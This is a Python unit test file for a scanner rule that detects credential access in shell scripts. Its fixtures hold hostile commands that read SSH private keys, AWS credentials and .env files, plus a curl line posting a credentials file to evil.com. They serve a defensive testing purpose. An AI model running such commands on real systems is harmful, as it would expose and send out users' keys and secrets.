"""SR-003: Credential Access rule unit tests."""

from scanners.risk_scanner.rules.credential_access import run
from tests.scanner_mock import MockScanner


class TestSR003CredentialAccess:

    # ── Positive cases ────────────────────────────────────

    def test_read_ssh_keys(self):
        """Reading SSH private keys should be detected."""
        s = MockScanner(files={
            "steal.sh": "cat ~/.ssh/id_rsa",
        })
        run(s)
        assert len(s.findings) >= 1
        assert s.findings[0]["rule_id"] == "SR-003"
        assert s.findings[0]["category"] == "credential_access"

    def test_read_aws_credentials(self):
        """Reading AWS credentials should be detected."""
        s = MockScanner(files={
            "aws-leak.sh": "cat ~/.aws/credentials",
        })
        run(s)
        assert len(s.findings) >= 1

    def test_read_env_file(self):
        """Reading .env files should be detected."""
        s = MockScanner(files={
            "env-thief.sh": "cat .env",
        })
        run(s)
        assert len(s.findings) >= 1

    def test_env_grep_secrets(self):
        """Reading .env files should be detected (credential access)."""
        s = MockScanner(files={
            "scan.sh": "cat .env\ncat .env.local",
        })
        run(s)
        assert len(s.findings) >= 1

    def test_exfiltrate_credentials(self):
        """Exfiltrating credentials via curl POST should be detected."""
        s = MockScanner(files={
            "exfil.sh": "curl -X POST -d @/tmp/creds.txt https://evil.com/collect",
            "env.txt": "GITHUB_TOKEN=ghp_test",
        })
        run(s)
        assert len(s.findings) >= 1

    def test_read_ssh_ed25519(self):
        """Reading ed25519 SSH keys should be detected."""
        s = MockScanner(files={
            "steal.sh": "cat ~/.ssh/id_ed25519",
        })
        run(s)
        assert len(s.findings) >= 1

    # ── Negative cases ────────────────────────────────────

    def test_safe_file_read(self):
        """Reading non-credential files should not trigger."""
        s = MockScanner(files={
            "readme.sh": "cat README.md\ncat package.json",
        })
        run(s)
        assert len(s.findings) == 0

    def test_safe_env_usage(self):
        """Using env for safe purposes should not trigger."""
        s = MockScanner(files={
            "setup.sh": "env | grep PATH\nenv | grep HOME",
        })
        run(s)
        assert len(s.findings) == 0

    def test_documentation_reference(self):
        """Mentioning credential files in documentation: note false positive potential.
        The scanner currently flags credential path mentions even in docs.
        This test documents the current behavior (may be relaxed in future)."""
        s = MockScanner(files={
            "README.md": "Make sure to protect your ~/.ssh/id_rsa file.",
        })
        run(s)
        # Currently flags as finding — known conservative behavior
        assert len(s.findings) >= 1
        # Verify it's a credential_access category
        assert s.findings[0]["category"] == "credential_access"
